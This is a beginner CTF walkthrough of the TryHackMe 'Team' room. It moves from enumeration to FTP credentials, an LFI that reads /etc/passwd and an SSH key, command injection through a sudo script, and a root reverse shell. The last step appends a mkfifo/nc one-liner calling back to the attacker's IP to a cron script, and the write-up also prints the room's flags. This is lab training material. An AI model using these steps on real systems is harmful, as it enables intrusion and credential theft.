## Team - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/teamcw)

<i>Hey all this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!


Please allow 3-5 minutes for the box to boot


Edit 06/03/21- Just to clarify there is several ways to root this machine. One is unintended but it is just another opportunity to learn :)

Created by:﻿dalemazza
Credit to P41ntP4rr0t for help along the way</i>

**IP: 10.10.1.78**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Feroxbuster <br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Feroxbuster.

  ```
  nmap -sC -sV -T5 -p- team.thm

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
  |   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
  |_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  feroxbuster -u http://team.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  301      GET        9l       28w      305c http://team.thm/images => http://team.thm/images/
  301      GET        9l       28w      306c http://team.thm/scripts => http://team.thm/scripts/
  301      GET        9l       28w      305c http://team.thm/assets => http://team.thm/assets/
  200      GET        9l       28w      305c http://team.thm/robots.txt => http://team.thm/robots.txt
  ```
  
- Robots gave us username `dale`. I did more enumeration on `/scripts` and found a hidden file.

  ```
  gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/dirb/common.txt -x txt, php

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.                    (Status: 403) [Size: 273]
  /.hta.txt             (Status: 403) [Size: 273]
  /.hta                 (Status: 403) [Size: 273]
  /.htaccess.           (Status: 403) [Size: 273]
  /.hta.                (Status: 403) [Size: 273]
  /.htpasswd            (Status: 403) [Size: 273]
  /.htaccess.txt        (Status: 403) [Size: 273]
  /.htaccess            (Status: 403) [Size: 273]
  /.htpasswd.           (Status: 403) [Size: 273]
  /.htpasswd.txt        (Status: 403) [Size: 273]
  /script.txt           (Status: 200) [Size: 597]
  Progress: 13842 / 13845 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Awesome, so I visited `http://team.thm/scripts/script.txt` and found a bash script.

  ```
  #!/bin/bash
  read -p "Enter Username: " REDACTED
  read -sp "Enter Username Password: " REDACTED
  echo
  ftp_server="localhost"
  ftp_username="$Username"
  ftp_password="$Password"
  mkdir /home/username/linux/source_folder
  source_folder="/home/username/source_folder/"
  cp -avr config* $source_folder
  dest_folder="/home/username/linux/dest_folder/"
  ftp -in $ftp_server <<END_SCRIPT
  quote USER $ftp_username
  quote PASS $decrypt
  cd $source_folder
  !cd $dest_folder
  mget -R *
  quit
  
  # Updated version of the script
  # Note to self had to change the extension of the old "script" in this folder, as it has creds in
  ```

- Note tells us about old script file. I got it after like 4th try lol.

  ```
  http://team.thm/scripts/script.old

  cat script.old     
  #!/bin/bash
  read -p "Enter Username: " ftpuser
  read -sp "Enter Username Password: " T3@m$h@r3
  echo
  ftp_server="localhost"
  ftp_username="$Username"
  ftp_password="$Password"
  mkdir /home/username/linux/source_folder
  source_folder="/home/username/source_folder/"
  cp -avr config* $source_folder
  dest_folder="/home/username/linux/dest_folder/"
  ftp -in $ftp_server <<END_SCRIPT
  quote USER $ftp_username
  quote PASS $decrypt
  cd $source_folder
  !cd $dest_folder
  mget -R *
  quit
  ```

- Now we have FTP credentials. Login and download the files from there.

  ```
  ftp 10.10.1.78 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  
  ftp> passive
  Passive mode: off; fallback to active mode: off.
  ftp> ls -al
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 .
  drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 ..
  -rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
  -rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
  drwxrwxr-x    3 1002     1002         4096 Jan 15  2021 .local
  -rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
  drwx------    2 1002     1002         4096 Jan 15  2021 .ssh
  drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
  226 Directory send OK.
  ftp> cd workshare
  250 Directory successfully changed.
  ftp> ls -al
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 .
  drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 ..
  -rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
  226 Directory send OK.
  ftp> get New_site.txt
  local: New_site.txt remote: New_site.txt
  200 EPRT command successful. Consider using EPSV.
  150 Opening BINARY mode data connection for New_site.txt (269 bytes).
  100% |************************************************************************|   269      490.10 KiB/s    00:00 ETA
  226 Transfer complete.
  269 bytes received in 00:00 (5.61 KiB/s)
  ftp> cd ..
  250 Directory successfully changed.
  ftp> cd .ssh
  250 Directory successfully changed.
  ftp> ls -al
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  drwx------    2 1002     1002         4096 Jan 15  2021 .
  drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 ..
  -rw-r--r--    1 1002     1002          222 Jan 15  2021 known_hosts
  226 Directory send OK.
  ftp> get known_hosts
  local: known_hosts remote: known_hosts
  200 EPRT command successful. Consider using EPSV.
  150 Opening BINARY mode data connection for known_hosts (222 bytes).
  100% |************************************************************************|   222      214.01 KiB/s    00:00 ETA
  226 Transfer complete.
  222 bytes received in 00:00 (4.56 KiB/s)
  ```

- Note about new site gives us another domain. Add it to `/etc/hosts` and visit it.

  ```
  cat New_site.txt 
  Dale
          I have started coding a new website in PHP for the team to use, this is currently under development. It can be
  found at ".dev" within our domain.
  
  Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
  
  Gyles
  ```

---

## 🌐 Web Exploitation 

- After visiting `http://dev.team.thm/`, there is a link for team share. On that link there is a potential LFI, I tried it with classic `/etc/passwd` and it worked.

  ```
  http://dev.team.thm/script.php?page=/etc/passwd

  root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/no/
  [SNIP!]run/sshd:/usr/sbin/nologin
  ```
  
- I pulled the list of all potential files to enumerate and there's a lot of them so I made a Python script to automate the process. To make your life easier this is the path for SSH key.

  ```
  http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

  #Dale id_rsa
  -----BEGIN OPENSSH PRIVATE KEY-----
  [SNIP!]
  -----END OPENSSH PRIVATE KEY-----
  ```
  
- Copy the key, change it's permission and login with SSH.

  ```
  ssh -i id_rsa dale@10.10.1.78 
  Last login: Mon Jan 18 10:51:32 2021
  dale@TEAM:~$ whoami
  dale
  dale@TEAM:~$ id
  uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
  ```
  
---

## 🧍 User Privilege Escalation

- First flag is already there, moving to esclation now.

  ```
  dale@TEAM:~$ pwd
  /home/dale
  
  dale@TEAM:~$ ls -al
  total 44
  drwxr-xr-x 6 dale dale 4096 Jan 15  2021 .
  drwxr-xr-x 5 root root 4096 Jan 15  2021 ..
  -rw------- 1 dale dale 2549 Jan 21  2021 .bash_history
  -rw-r--r-- 1 dale dale  220 Jan 15  2021 .bash_logout
  -rw-r--r-- 1 dale dale 3771 Jan 15  2021 .bashrc
  drwx------ 2 dale dale 4096 Jan 15  2021 .cache
  drwx------ 3 dale dale 4096 Jan 15  2021 .gnupg
  drwxrwxr-x 3 dale dale 4096 Jan 15  2021 .local
  -rw-r--r-- 1 dale dale  807 Jan 15  2021 .profile
  drwx------ 2 dale dale 4096 Jan 15  2021 .ssh
  -rw-r--r-- 1 dale dale    0 Jan 15  2021 .sudo_as_admin_successful
  -rw-rw-r-- 1 dale dale   17 Jan 15  2021 user.txt
  
  dale@TEAM:~$ cat user.txt 
  THM{6Y0TXHz7c2d}
  ```

---

## 👑 Root Privilege Escalation

- This one was a bit tricky. First run `sudo -l`.

  ```
  dale@TEAM:~$ sudo -l
  Matching Defaults entries for dale on TEAM:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User dale may run the following commands on TEAM:
      (gyles) NOPASSWD: /home/gyles/admin_checks
  ```
  
- OK, so `gyles` can run this file which means we have to escalate twice. Let's check that file first.

  ```
  dale@TEAM:/home/gyles$ cat admin_checks 
  #!/bin/bash
  
  printf "Reading stats.\n"
  sleep 1
  printf "Reading stats..\n"
  sleep 1
  read -p "Enter name of person backing up the data: " name
  echo $name  >> /var/stats/stats.txt
  read -p "Enter 'date' to timestamp the file: " error
  printf "The Date is "
  $error 2>/dev/null
  
  date_save=$(date "+%F-%H-%M")
  cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
  
  printf "Stats have been backed up\n"
  ```

  ```
  dale@TEAM:/home/gyles$ cat /var/stats/stats.txt 
  Website_views=1337
  Unique_views=436
  Disc_members=16
  Events_won=1
  
  
  anon
  anon
  anon
  anon
  anon
  anon
  anon
  anon
  anon
  ```

  ```
  dale@TEAM:/home/gyles$ ls -al /var/stats/
  total 12
  drwxrwxrwx  2 root root    4096 Jan 21  2021 .
  drwxr-xr-x 15 root root    4096 Jan 15  2021 ..
  -rw-rw-rw-  1 dale editors  112 Jan 21  2021 stats.txt
  ```
  
- In order to escalate to `gyles` we can just run the script and instead of providing actual date we will provide `/bin/bash -i`. For username you can use anything. Keep in mind, after providing time, you wont't be able to see your inputs, so do the classic putty shell.

  ```
  dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
  Reading stats.
  Reading stats..
  Enter name of person backing up the data: bimbo
  Enter 'date' to timestamp the file: /bin/bash -i
  The Date is python3 -c 'import pty;pty.spawn("/bin/bash")'
  The Date is gyles@TEAM:/home/gyles$ whoami
  gyles
  gyles@TEAM:/home/gyles$ id
  uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
  ```

- Now we have to escalate to root. I spent a lot of time enumerating here and in the end I found a script that can do all of that for us. You can download `pspy64` from [here](https://github.com/DominicBreuker/pspy)

- Move the script to target machine with HTTP server and run it.

  ```
  gyles@TEAM:/home/gyles$ ls
  admin_checks  pspy64s
  
  gyles@TEAM:/home/gyles$ chmod +x pspy64s 
  gyles@TEAM:/home/gyles$ ls
  admin_checks  pspy64s
  
  gyles@TEAM:/home/gyles$ ./pspy64s
  ```

- Script will go on until you stop it and output will be crazy long, here are the files that we are looking for.

  ```
  2025/05/16 20:04:01 CMD: UID=0    PID=2329   | /bin/bash /usr/local/bin/main_backup.sh 
  2025/05/16 20:04:01 CMD: UID=0    PID=2331   | /bin/bash /usr/local/sbin/dev_backup.sh 
  ```

- `main_backup.sh` is owned by root but admin group can run it, and `gyles` is a part of admin group. Let's put a reverse shell there, start a listener on another terminal and wait for script to run automatically after a minute.

  ```
  gyles@TEAM:/home/gyles$ ls -al /usr/local/bin/main_backup.sh
  -rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh

  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 5555 >/tmp/f" >> /usr/local/bin/main_backup.sh

  nc -lvnp 5555
  listening on [any] 5555 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.1.78] 54602
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  # cat /root/root.txt
  THM{fhqbznavfonq}
  ```

- That's it folks!
  
---

## 🏁 Flags

- **User Flag**: `THM{6Y0TXHz7c2d}`
- **Root Flag**: `THM{fhqbznavfonq}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Honestly, just finding right tools and correct enumeration.`

- What did I learn?
  `Some bash scripting and new way of enumeration and privilege escalation`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
